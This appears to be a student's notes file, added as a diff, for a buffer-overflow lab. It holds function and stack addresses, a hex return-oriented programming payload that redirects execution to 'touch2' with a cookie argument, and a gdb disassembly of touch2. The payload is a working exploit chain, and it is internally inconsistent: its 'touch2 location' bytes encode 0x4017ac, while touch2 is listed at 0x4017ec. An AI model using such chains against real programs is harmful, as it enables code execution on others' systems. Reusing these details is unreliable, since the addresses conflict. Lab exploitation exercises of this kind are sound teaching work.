@@ -1,0 +1,33 @@
+touch1 address: 0x4017c0
+touch2 address: 0x4017ec
+touch3 address: 0x4018fa
+rsp address: 0x5561dca0
+
+a7 19 40 00 00 00 00 00 /* popq &rax */
+fa 97 b9 59 00 00 00 00 /* cookie value */
+a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
+ac 17 40 00 00 00 00 00 /* touch2 location */
+
+Dump of assembler code for function touch2:
+   0x00000000004017ec <+0>:     sub    $0x8,%rsp
+   0x00000000004017f0 <+4>:     mov    %edi,%edx
+   0x00000000004017f2 <+6>:     movl   $0x2,0x203ce0(%rip)        # 0x6054dc <vlevel>
+   0x00000000004017fc <+16>:    cmp    0x203ce2(%rip),%edi        # 0x6054e4 <cookie>
+   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
+   0x0000000000401804 <+24>:    mov    $0x403208,%esi
+   0x0000000000401809 <+29>:    mov    $0x1,%edi
+   0x000000000040180e <+34>:    mov    $0x0,%eax
+   0x0000000000401813 <+39>:    callq  0x400df0 <__printf_chk@plt>
+   0x0000000000401818 <+44>:    mov    $0x2,%edi
+   0x000000000040181d <+49>:    callq  0x401dad <validate>
+   0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
+   0x0000000000401824 <+56>:    mov    $0x403230,%esi
+   0x0000000000401829 <+61>:    mov    $0x1,%edi
+   0x000000000040182e <+66>:    mov    $0x0,%eax
+   0x0000000000401833 <+71>:    callq  0x400df0 <__printf_chk@plt>
+---Type <return> to continue, or q <return> to quit---
+   0x0000000000401838 <+76>:    mov    $0x2,%edi
+   0x000000000040183d <+81>:    callq  0x401e6f <fail>
+   0x0000000000401842 <+86>:    mov    $0x0,%edi
+   0x0000000000401847 <+91>:    callq  0x400e40 <exit@plt>
+End of assembler dump.
